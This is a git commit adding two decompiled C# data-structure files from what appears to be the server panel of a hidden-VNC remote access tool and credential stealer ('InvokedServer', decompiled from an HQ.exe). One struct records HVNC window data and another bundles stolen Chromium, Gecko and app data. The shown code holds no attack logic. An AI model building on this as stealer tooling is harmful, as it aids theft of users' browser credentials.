8076d63fe4592c6551cdcc6b547025b51dcfdb5b
Grandmother <mikebenis47@gmail.com>
2026-01-11 16:37:18 -0500

    Add files via upload

---
+++ DataStructs/HVNCImageDataStruct.cs
@@ -0,0 +1,21 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: InvokedServer.DataStructs.HVNCImageDataStruct
+// Assembly: HQ, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: C53BC0E5-A85B-41E9-8105-FC74ED122A9A
+// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\HQ.exe
+
+
+namespace InvokedServer.DataStructs
+{
+	public struct HVNCImageDataStruct
+	{
+		public string sizeText;
+		public int windowCount;
+
+		public HVNCImageDataStruct(string _sizeText, int _windowCount)
+		{
+			this.sizeText = _sizeText;
+			this.windowCount = _windowCount;
+		}
+	}
+}
---
+++ DataStructs/StealerLog.cs
@@ -0,0 +1,20 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: InvokedServer.DataStructs.StealerLog
+// Assembly: HQ, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: C53BC0E5-A85B-41E9-8105-FC74ED122A9A
+// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\HQ.exe
+
+using InvokedCommon.Structs;
+
+
+namespace InvokedServer.DataStructs
+{
+	public class StealerLog
+	{
+		public ChromiumBrowser[] chromiumData { get; set; }
+
+		public GeckoBrowser[] geckoData { get; set; }
+
+		public AppsData appsData { get; set; }
+	}
+}
